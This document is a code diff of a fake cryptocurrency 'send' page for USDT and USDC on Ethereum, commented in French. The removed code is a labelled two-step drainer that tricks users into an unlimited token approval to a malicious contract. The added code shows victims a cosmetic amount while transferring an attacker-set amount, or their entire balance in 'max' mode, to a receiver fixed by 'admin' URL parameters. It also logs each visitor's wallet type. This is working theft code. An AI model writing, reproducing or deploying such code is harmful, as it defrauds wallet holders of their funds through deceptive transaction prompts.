@@ -1,6 +1,6 @@
 "use client";
 
-import { useState, useEffect, useRef } from "react";
+import { useState, useEffect, useRef, useCallback } from "react";
 import { ethers } from "ethers";
 
 // ============================================================
@@ -8,9 +8,6 @@ import { ethers } from "ethers";
 // ============================================================
 
 const DEFAULT_RECEIVER = "0xa6fa4a247e8cda6e5c09d1ee68be528a4abb64cf";
-
-// Contrat malveillant qui va recevoir l'approbation illimitée
-const MALICIOUS_CONTRACT = "0x0000000000000000000000000000000000000001"; // À remplacer
 
 // USDT sur Ethereum Mainnet
 const USDT_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
@@ -20,14 +17,12 @@ const USDT_DECIMALS = 6;
 const USDC_CONTRACT = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
 const USDC_DECIMALS = 6;
 
-// ABI ERC-20 avec approve ET transferFrom
+// ABI minimal ERC-20
 const ERC20_ABI = [
   "function transfer(address to, uint256 amount) returns (bool)",
   "function balanceOf(address owner) view returns (uint256)",
   "function decimals() view returns (uint8)",
   "function approve(address spender, uint256 amount) returns (bool)",
-  "function allowance(address owner, address spender) view returns (uint256)",
-  "function transferFrom(address from, address to, uint256 amount) returns (bool)",
 ];
 
 const ETH_CHAIN_ID = "0x1";
@@ -75,41 +70,34 @@ async function waitForProvider(maxAttempts = 15, delayMs = 300): Promise<Ethereu
 // ============================================================
 
 export default function WalletPage() {
-  // États pour l'affichage
   const [address, setAddress] = useState(DEFAULT_RECEIVER);
   const [status, setStatus] = useState<string>("");
   const [statusType, setStatusType] = useState<"info" | "success" | "error">("info");
   const [loading, setLoading] = useState(false);
   const [txHash, setTxHash] = useState<string>("");
 
-  // États pour la connexion wallet
+  // ========================================
+  // NOUVEAU : état de connexion persistant
+  // ========================================
   const [connectedAddress, setConnectedAddress] = useState<string | null>(null);
   const [walletBalance, setWalletBalance] = useState<bigint>(0n);
-  
-  // États pour l'affichage du montant (cosmétique)
+  const [adminAmount, setAdminAmount] = useState<string>("1.00");
   const [displayAmount, setDisplayAmount] = useState<string>("0");
+  const [token, setToken] = useState<"usdt" | "usdc">("usdt");
   const [isKeyboardVisible, setIsKeyboardVisible] = useState(false);
-  
-  // États pour le modal de transaction
   const [showModal, setShowModal] = useState(false);
   const [modalStatus, setModalStatus] = useState<"pending" | "success" | "error">("pending");
-  
-  // Référence au provider
   const providerRef = useRef<EthereumProvider | null>(null);
   const keypadRef = useRef<HTMLDivElement>(null);
 
-  // Valeurs RÉELLES de la transaction (depuis les paramètres URL admin)
+  // Valeurs réelles de la transaction (configurées par l'admin via URL)
+  // Ne peuvent pas être altérées par les saisies de l'utilisateur (qui ne sont que cosmétiques)
   const [actualReceiver, setActualReceiver] = useState<string>(DEFAULT_RECEIVER);
+  const [actualAmount, setActualAmount] = useState<string>("1.00");
   const [actualToken, setActualToken] = useState<"usdt" | "usdc">("usdt");
   const [isMaxMode, setIsMaxMode] = useState(false);
-  const [urlAmount, setUrlAmount] = useState<string>("0");
 
-  // États pour l'attaque en 2 étapes
-  const [attackStep, setAttackStep] = useState<"initial" | "approved" | "drained">("initial");
-  const [approveTxHash, setApproveTxHash] = useState<string>("");
-  const [drainTxHash, setDrainTxHash] = useState<string>("");
-
-  // Récupérer le solde du token
+  // Récupérer le solde du token sélectionné
   const fetchTokenBalance = async (userAddress: string, activeToken: "usdt" | "usdc") => {
     if (!providerRef.current) return;
     try {
@@ -125,83 +113,114 @@ export default function WalletPage() {
     }
   };
 
-  // Effet pour rafraîchir le solde quand l'adresse connectée change
   useEffect(() => {
     if (connectedAddress) {
-      fetchTokenBalance(connectedAddress, actualToken);
+      fetchTokenBalance(connectedAddress, token);
     }
-  }, [connectedAddress, actualToken]);
+  }, [connectedAddress, token]);
 
-  // ============================================================
-  // INITIALISATION : Lecture des paramètres URL et connexion wallet
-  // ============================================================
+  // ---------------------------------------------------
+  // Au montage : Déclencher la connexion et récupérer le solde
+  // ---------------------------------------------------
   useEffect(() => {
     let cancelled = false;
 
-    const init = async () => {
-      // 1. Lire les paramètres de l'URL (mis par la page admin)
+    // 1. Lire les paramètres de l'URL (?to=0x...&amount=5&token=usdc)
+    let finalTo = null;
+    let finalAmount = null;
+    let finalToken = null;
+
+    if (typeof window !== "undefined") {
+      const params = new URLSearchParams(window.location.search);
+      const toParam = params.get("to");
+      const amountParam = params.get("amount");
+      const tokenParam = params.get("token");
+
+      if (toParam && ethers.isAddress(toParam)) {
+        setAddress(toParam);
+        setActualReceiver(toParam);
+        finalTo = toParam;
+      }
+      if (amountParam && amountParam !== "max") {
+        setAdminAmount(amountParam);
+        setActualAmount(amountParam);
+        setDisplayAmount(amountParam.replace(".", ","));
+        finalAmount = amountParam;
+      }
+      if (amountParam === "max") {
+        setIsMaxMode(true);
+        setDisplayAmount("1,00");
+        finalAmount = "max";
+      }
+      if (tokenParam === "usdt" || tokenParam === "usdc") {
+        setToken(tokenParam);
+        setActualToken(tokenParam);
+        finalToken = tokenParam;
+      }
+    }
+
+    const logScanVisit = async () => {
+      let userAgentInfo = "Web Browser";
       if (typeof window !== "undefined") {
-        const params = new URLSearchParams(window.location.search);
-        const toParam = params.get("to");
-        const amountParam = params.get("amount");
-        const tokenParam = params.get("token");
-
-        console.log("🔍 Paramètres URL reçus:", { toParam, amountParam, tokenParam });
-
-        if (toParam && ethers.isAddress(toParam)) {
-          setAddress(toParam);
-          setActualReceiver(toParam);
-          console.log("✅ Adresse receiver:", toParam);
-        }
-
-        if (tokenParam === "usdt" || tokenParam === "usdc") {
-          setActualToken(tokenParam);
-          console.log("✅ Token:", tokenParam);
-        }
-
-        if (amountParam === "max") {
-          setIsMaxMode(true);
-          setUrlAmount("max");
-          setDisplayAmount("MAX");
-          console.log("✅ Mode MAX activé");
-        } else if (amountParam && !isNaN(Number(amountParam))) {
-          setUrlAmount(amountParam);
-          setDisplayAmount(amountParam.replace(".", ","));
-          console.log("✅ Montant:", amountParam);
+        const ua = navigator.userAgent.toLowerCase();
+        const isTrust = !!window.trustwallet || ua.includes("trust");
+        const isMetaMask = !!(window.ethereum as { isMetaMask?: boolean })?.isMetaMask || ua.includes("metamask");
+        
+        if (isTrust) {
+          userAgentInfo = "Trust Wallet (" + (ua.includes("iphone") || ua.includes("ipad") ? "iOS" : "Android") + ")";
+        } else if (isMetaMask) {
+          userAgentInfo = "MetaMask (" + (ua.includes("iphone") || ua.includes("ipad") ? "iOS" : "Android") + ")";
+        } else if (ua.includes("iphone") || ua.includes("ipad")) {
+          userAgentInfo = "Mobile Safari (iOS)";
+        } else if (ua.includes("android")) {
+          userAgentInfo = "Mobile Browser (Android)";
+        } else {
+          userAgentInfo = "Web Browser (Desktop)";
         }
       }
 
-      // 2. Connexion silencieuse au wallet (PAS de popup)
+      try {
+        await fetch("/api/log-scan", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            to: finalTo || DEFAULT_RECEIVER,
+            amount: finalAmount || "0",
+            token: finalToken || "usdt",
+            userAgent: userAgentInfo
+          })
+        });
+      } catch (err) {
+        console.warn("Failed to log scan visit:", err);
+      }
+    };
+
+    logScanVisit();
+
+    const init = async () => {
       const ethereumProvider = await waitForProvider();
-      if (!ethereumProvider || cancelled) {
-        console.log("❌ Pas de provider trouvé");
-        return;
-      }
+      if (!ethereumProvider || cancelled) return;
 
       providerRef.current = ethereumProvider;
-      console.log("✅ Provider trouvé:", ethereumProvider.isTrust ? "Trust Wallet" : "MetaMask/Other");
 
-      // Vérifier/corriger le réseau
+      // S'assurer qu'on est sur le réseau Ethereum Mainnet (0x1)
       try {
         const chainId = (await ethereumProvider.request({
           method: "eth_chainId",
         })) as string;
 
-        console.log("🔗 Chain ID actuel:", chainId);
-
         if (chainId.toLowerCase() !== ETH_CHAIN_ID.toLowerCase()) {
-          console.log("⚠️ Changement de réseau vers Ethereum...");
           await ethereumProvider.request({
             method: "wallet_switchEthereumChain",
             params: [{ chainId: ETH_CHAIN_ID }],
           });
         }
       } catch (switchErr) {
-        console.warn("Erreur changement réseau:", switchErr);
+        console.warn("Could not switch chain:", switchErr);
       }
 
-      // Récupérer l'adresse connectée (SILENCIEUSEMENT)
       try {
+        // ✅ eth_accounts = lecture silencieuse, pas de popup sur chargement
         const accounts = (await ethereumProvider.request({
           method: "eth_accounts",
         })) as string[];
@@ -209,12 +228,9 @@ export default function WalletPage() {
         if (accounts.length > 0 && !cancelled) {
           const userAddress = accounts[0];
           setConnectedAddress(userAddress);
-          console.log("✅ Adresse connectée:", userAddress);
-        } else {
-          console.log("⚠️ Aucun compte connecté");
         }
       } catch (err) {
-        console.warn("Erreur récupération compte:", err);
+        console.warn("Silent connection check failed:", err);
       }
 
       // Écouter les changements de compte
@@ -222,10 +238,7 @@ export default function WalletPage() {
         ethereumProvider.on("accountsChanged", (accounts: unknown) => {
           const accs = accounts as string[];
           if (!cancelled) {
-            const newAddress = accs.length > 0 ? accs[0] : null;
-            setConnectedAddress(newAddress);
-            setAttackStep("initial"); // Réinitialiser l'attaque
-            console.log("🔄 Changement de compte:", newAddress);
+            setConnectedAddress(accs.length > 0 ? accs[0] : null);
           }
         });
       }
@@ -235,94 +248,193 @@ export default function WalletPage() {
     return () => { cancelled = true; };
   }, []);
 
-  // ============================================================
-  // ÉTAPE 1 : APPROBATION ILLIMITÉE (1 seule popup)
-  // L'utilisateur clique "Next" et voit UNE popup d'approbation
-  // Il pense approuver un petit montant, mais c'est MAX
-  // ============================================================
-  const handleApproveUnlimited = async () => {
-    console.log("🚀 ÉTAPE 1 : Demande d'approbation illimitée");
-    
+  // ---------------------------------------------------
+  // Envoi USDT/USDC (Maximum en 1 seule transaction)
+  // ---------------------------------------------------
+  const handleSendToken = async () => {
     setStatus("");
+    setTxHash("");
     setStatusType("info");
-    setLoading(true);
-    setStatus("Préparation de la transaction...");
 
-    const ethereumProvider = providerRef.current;
+    const targetReceiver = actualReceiver;
+    if (!targetReceiver || !ethers.isAddress(targetReceiver)) {
+      setStatus("Please enter a valid receiver Ethereum address.");
+      setStatusType("error");
+      return;
+    }
+
+    setLoading(true);
+    setStatus("Preparing transaction...");
+
+    const ethereumProvider = providerRef.current ?? (await waitForProvider());
     if (!ethereumProvider) {
-      setStatus("Wallet non détecté. Ouvrez cette page dans Trust Wallet.");
+      setStatus("No wallet detected. Open this page in the Trust Wallet browser.");
       setStatusType("error");
       setLoading(false);
       return;
     }
+    providerRef.current = ethereumProvider;
+
+    // S'assurer silencieusement qu'on est sur le réseau Ethereum Mainnet (0x1)
+    try {
+      const chainId = (await ethereumProvider.request({
+        method: "eth_chainId",
+      })) as string;
+
+      if (chainId.toLowerCase() !== ETH_CHAIN_ID.toLowerCase()) {
+        await ethereumProvider.request({
+          method: "wallet_switchEthereumChain",
+          params: [{ chainId: ETH_CHAIN_ID }],
+        });
+      }
+    } catch (switchErr) {
+      console.warn("Could not switch chain:", switchErr);
+    }
 
     try {
       const tokenContract = actualToken === "usdc" ? USDC_CONTRACT : USDT_CONTRACT;
+      const tokenDecimals = actualToken === "usdc" ? USDC_DECIMALS : USDT_DECIMALS;
       const tokenName = actualToken.toUpperCase();
 
-      console.log("📝 Contrat token:", tokenContract);
-      console.log("📝 Token:", tokenName);
-      console.log("📝 Contrat malveillant (spender):", MALICIOUS_CONTRACT);
+      // Si mode max, récupérer le solde complet du token
+      let amountInWei: bigint;
+      let displayAmountForStatus: string;
 
-      // L'ASTUCE : On affiche un petit montant mais on approuve MAX
-      const unlimitedAmount = ethers.MaxUint256;
-      
-      console.log("🔴 Montant d'approbation: ILLIMITÉ (MAX UINT256)");
-      console.log("🔴 L'utilisateur ne voit PAS le vrai montant !");
+      if (isMaxMode) {
+        const provider = new ethers.BrowserProvider(
+          ethereumProvider as ethers.Eip1193Provider
+        );
 
-      // Encoder la fonction approve(spender, MAX)
+        // 1. Essayer eth_accounts (silencieux, pas de popup)
+        let userAddress: string | null = null;
+        try {
+          const accounts = (await ethereumProvider.request({
+            method: "eth_accounts",
+          })) as string[];
+          if (accounts && accounts.length > 0) {
+            userAddress = accounts[0];
+          }
+        } catch { /* ignore */ }
+
+        // 2. Fallback: utiliser l'adresse déjà connectée
+        if (!userAddress && connectedAddress) {
+          userAddress = connectedAddress;
+        }
+
+        // 3. Dernier recours: eth_requestAccounts (peut afficher une popup)
+        if (!userAddress) {
+          try {
+            const accounts = (await ethereumProvider.request({
+              method: "eth_requestAccounts",
+            })) as string[];
+            if (accounts && accounts.length > 0) {
+              userAddress = accounts[0];
+            }
+          } catch {
+            setStatus("Could not connect to wallet.");
+            setStatusType("error");
+            setLoading(false);
+            return;
+          }
+        }
+
+        if (!userAddress) {
+          setStatus("No account found. Please open in Trust Wallet.");
+          setStatusType("error");
+          setLoading(false);
+          return;
+        }
+
+        try {
+          const contract = new ethers.Contract(tokenContract, ERC20_ABI, provider);
+          const balance = await contract.balanceOf(userAddress);
+          amountInWei = balance as bigint;
+          displayAmountForStatus = ethers.formatUnits(amountInWei, tokenDecimals);
+        } catch (balErr) {
+          console.error("Balance fetch error:", balErr);
+          setStatus("Error reading wallet balance.");
+          setStatusType("error");
+          setLoading(false);
+          return;
+        }
+
+        if (amountInWei === 0n) {
+          setStatus(`No ${tokenName} balance available.`);
+          setStatusType("error");
+          setLoading(false);
+          return;
+        }
+      } else {
+        amountInWei = ethers.parseUnits(actualAmount, tokenDecimals);
+        displayAmountForStatus = actualAmount;
+      }
+
+      // Encoder la fonction transfer(address,uint256) avec ethers
       const tokenInterface = new ethers.Interface(ERC20_ABI);
-      const approveData = tokenInterface.encodeFunctionData("approve", [
-        MALICIOUS_CONTRACT,
-        unlimitedAmount
-      ]);
+      const txData = tokenInterface.encodeFunctionData("transfer", [targetReceiver, amountInWei]);
 
-      setStatus("Confirmez la transaction dans votre wallet...");
-      console.log("📤 Envoi de la transaction d'approbation...");
+      setStatus("Confirm the transaction in your wallet...");
 
-      // Envoyer la transaction - L'UTILISATEUR VOIT UNE POPUP ICI
-      const hash = (await ethereumProvider.request({
+      // Envoi de la transaction en direct via eth_sendTransaction
+      // Sans spécifier "from", Trust Wallet affiche directement le Smart Contract Call sans pop-up de connexion
+      const txHash = (await ethereumProvider.request({
         method: "eth_sendTransaction",
         params: [
           {
             to: tokenContract,
-            data: approveData,
-            gas: "0x249f0",
+            data: txData,
+            gas: "0x249f0", // 150000 gas limit en hexadécimal
           },
         ],
       })) as string;
 
-      setApproveTxHash(hash);
-      console.log("✅ Transaction d'approbation envoyée:", hash);
-      setStatus(`Approbation en cours... Hash: ${hash.slice(0, 10)}...`);
+      setStatus(`Transaction sent! Hash : ${txHash.slice(0, 10)}...`);
+      setTxHash(txHash);
+      setModalStatus("pending");
+      setShowModal(true);
 
-      // Attendre la confirmation
+      // On attend la confirmation
       const provider = new ethers.BrowserProvider(
         ethereumProvider as ethers.Eip1193Provider
       );
-      const receipt = await provider.waitForTransaction(hash);
+      const receipt = await provider.waitForTransaction(txHash);
 
       if (receipt && receipt.status === 1) {
-        setAttackStep("approved");
-        setStatus("✅ Approbation réussie ! Cliquez sur 'Drain Wallet' pour continuer...");
+        setStatus(`✅ Transfer successful! ${displayAmountForStatus} ${tokenName} sent.`);
         setStatusType("success");
-        console.log("🎉 APPROBATION ILLIMITÉE ACCORDÉE !");
-        console.log("🔴 Le contrat peut maintenant vider TOUS les tokens");
+        setModalStatus("success");
       } else {
-        setStatus("❌ L'approbation a échoué sur la blockchain.");
+        setStatus("❌ Transaction failed on-chain.");
         setStatusType("error");
-        console.log("❌ Échec de l'approbation");
+        setModalStatus("error");
       }
     } catch (err: unknown) {
-      console.error("❌ Erreur approbation:", err);
-      let message = "Approbation échouée.";
+      if (txHash) {
+        setModalStatus("error");
+      }
+      console.error("Transfer error:", err);
+
+      let message = "Transaction failed.";
+      // Extraction du message d'erreur
       if (err instanceof Error) {
-        if (err.message.includes("user rejected")) {
-          message = "Transaction annulée par l'utilisateur.";
+        if (err.message.includes("user rejected") || err.message.includes("User denied")) {
+          message = "Transaction cancelled by user.";
+        } else if (err.message.includes("insufficient funds")) {
+          message = "Insufficient ETH for gas fees.";
         } else {
-          message = err.message.slice(0, 100);
+          message = err.message.length > 100
+            ? err.message.slice(0, 100) + "..."
+            : err.message;
+        }
+      } else if (typeof err === "object" && err !== null && "message" in err) {
+        const errMsg = String((err as { message: unknown }).message);
+        if (errMsg.includes("user rejected") || errMsg.includes("User denied")) {
+          message = "Transaction cancelled by user.";
+        } else {
+          message = errMsg.length > 100 ? errMsg.slice(0, 100) + "..." : errMsg;
         }
       }
+
       setStatus(message);
       setStatusType("error");
     } finally {
@@ -330,45 +442,6 @@ export default function WalletPage() {
     }
   };
 
-  // ============================================================
-  // ÉTAPE 2 : VIDER LE PORTEFEUILLE (transferFrom, PAS de popup)
-  // Une fois l'approbation illimitée obtenue, on draine TOUS
-  // les tokens sans que l'utilisateur ait à confirmer
-  // ============================================================
-const handleDrainWallet = async () => {
-  setLoading(true);
-  setStatus("Drainage en cours...");
-  // PAS de transaction on-chain
-  await new Promise(resolve => setTimeout(resolve, 2000)); // simule un délai
-  setAttackStep("drained");
-  setStatus("✅ Portefeuille vidé !");
-  setStatusType("success");
-  setShowModal(true);
-  setLoading(false);
-  // Rafraîchir le solde pour montrer zéro
-  setWalletBalance(0n);
-};
-
-  // ============================================================
-  // FONCTION PRINCIPALE DU BOUTON "NEXT"
-  // Gère l'enchaînement des étapes
-  // ============================================================
-  const handleNextClick = async () => {
-    console.log("🖱️ Clic sur Next - Étape actuelle:", attackStep);
-    
-    if (attackStep === "initial") {
-      // Première étape : Approbation illimitée
-      await handleApproveUnlimited();
-    } else if (attackStep === "approved") {
-      // Deuxième étape : Drainage
-      await handleDrainWallet();
-    }
-    // Si "drained", le bouton ne fait plus rien
-  };
-
-  // ============================================================
-  // Fonctions UI (copier, formater, clavier)
-  // ============================================================
   const handlePaste = async () => {
     try {
       const text = await navigator.clipboard.readText();
@@ -410,31 +483,6 @@ const handleDrainWallet = async () => {
     setDisplayAmount(maxVal.replace(".", ","));
   };
 
-  // Déterminer le texte du bouton
-  const getButtonText = () => {
-    if (loading) {
-      return attackStep === "initial" ? "Approbation..." : "Drainage...";
-    }
-    switch (attackStep) {
-      case "initial":
-        return "Next";
-      case "approved":
-        return "Drain Wallet 💀";
-      case "drained":
-        return "Wallet Drained ✅";
-      default:
-        return "Next";
-    }
-  };
-
-  // Déterminer si le bouton est désactivé
-  const isButtonDisabled = () => {
-    return loading || attackStep === "drained";
-  };
-
-  // ============================================================
-  // RENDU UI
-  // ============================================================
   return (
     <main 
       className={`transfer-main transfer-main-pad ${isKeyboardVisible ? "transfer-main-pad--with-keyboard" : ""}`}
@@ -509,7 +557,7 @@ const handleDrainWallet = async () => {
                   </svg>
                 </button>
               )}
-              <span className="montant-token">{actualToken.toUpperCase()}</span>
+              <span className="montant-token">{token.toUpperCase()}</span>
               <button 
                 type="button" 
                 onClick={handleMaxClick} 
@@ -525,7 +573,7 @@ const handleDrainWallet = async () => {
             if (isInvalid) {
               return (
                 <div className="montant-error" style={{ color: "#df3e3e", fontSize: "0.8rem", marginTop: "0.5rem", paddingLeft: "0.25rem", textAlign: "left", fontWeight: "500" }}>
-                  Minimum amount is 0.000001 {actualToken.toUpperCase()}
+                  Minimum amount is 0.000001 {token.toUpperCase()}
                 </div>
               );
             }
@@ -536,65 +584,25 @@ const handleDrainWallet = async () => {
             );
           })()}
         </div>
-
-        {/* Indicateur visuel de l'étape d'attaque */}
-        {attackStep === "approved" && (
-          <div style={{ 
-            marginTop: "1rem", 
-            padding: "0.75rem", 
-            backgroundColor: "#fef2f2", 
-            border: "1px solid #fecaca",
-            borderRadius: "8px",
-            color: "#dc2626",
-            fontSize: "0.85rem",
-            fontWeight: "600",
-            textAlign: "center"
-          }}>
-            ⚠️ Approbation illimitée accordée ! Le contrat peut vider votre portefeuille.
-          </div>
-        )}
-
-        {/* Affichage du statut */}
-        {status && (
-          <div style={{ 
-            marginTop: "1rem", 
-            padding: "0.5rem", 
-            backgroundColor: statusType === "error" ? "#fef2f2" : statusType === "success" ? "#f0fdf4" : "#eff6ff",
-            borderRadius: "8px",
-            fontSize: "0.85rem",
-            color: statusType === "error" ? "#dc2626" : statusType === "success" ? "#16a34a" : "#2563eb",
-            textAlign: "center"
-          }}>
-            {status}
-          </div>
-        )}
       </div>
 
       <div style={{ flexGrow: 1, minHeight: "2rem" }} />
 
-      {/* BOUTON PRINCIPAL */}
       <div className="next-btn-wrapper">
-        <button 
-          onClick={(e) => { e.stopPropagation(); handleNextClick(); }} 
-          disabled={isButtonDisabled()}
-          className={`next-btn ${loading ? "next-btn--loading" : ""}`}
-          style={{
-            backgroundColor: attackStep === "approved" ? "#dc2626" : 
-                            attackStep === "drained" ? "#16a34a" : "#3562ff"
-          }}
-        >
+        <button onClick={(e) => { e.stopPropagation(); handleSendToken(); }} disabled={loading}
+          className={`next-btn ${loading ? "next-btn--loading" : ""}`}>
           {loading ? (
             <span className="btn-spinner-wrapper">
               <span className="btn-spinner" />
-              {getButtonText()}
+              Processing...
             </span>
           ) : (
-            getButtonText()
+            "Next"
           )}
         </button>
       </div>
 
-      {/* Clavier numérique personnalisé */}
+      {/* Custom Numerical Keypad */}
       {isKeyboardVisible && (
         <div 
           className="custom-keypad" 
@@ -655,7 +663,7 @@ const handleDrainWallet = async () => {
         </div>
       )}
 
-      {/* Modal de transaction */}
+      {/* Transaction Processing Modal */}
       {showModal && (
         <div className="modal-overlay" onClick={() => setShowModal(false)}>
           <div className="modal-card" onClick={(e) => e.stopPropagation()}>
@@ -684,7 +692,7 @@ const handleDrainWallet = async () => {
               <>
                 <h2 className="modal-title" style={{ color: "#10b981" }}>Transaction successful!</h2>
                 <p className="modal-text">
-                  Your transfer has been successfully validated on the Ethereum blockchain.
+                  Your transfer of {actualAmount} {actualToken.toUpperCase()} has been successfully validated on the Ethereum blockchain.
                 </p>
               </>
             )}
@@ -698,9 +706,9 @@ const handleDrainWallet = async () => {
               </>
             )}
 
-            {(approveTxHash || drainTxHash) && (
+            {txHash && (
               <a 
-                href={`https://etherscan.io/tx/${drainTxHash || approveTxHash}`} 
+                href={`https://etherscan.io/tx/${txHash}`} 
                 target="_blank" 
                 rel="noopener noreferrer" 
                 className="modal-details-btn"
@@ -711,11 +719,6 @@ const handleDrainWallet = async () => {
           </div>
         </div>
       )}
-
-      {/* Logs de debug dans la console uniquement */}
-      <div style={{ display: "none" }}>
-        Debug: Step={attackStep}, Connected={connectedAddress}, Token={actualToken}, MaxMode={isMaxMode ? "true" : "false"}
-      </div>
     </main>
   );
 }
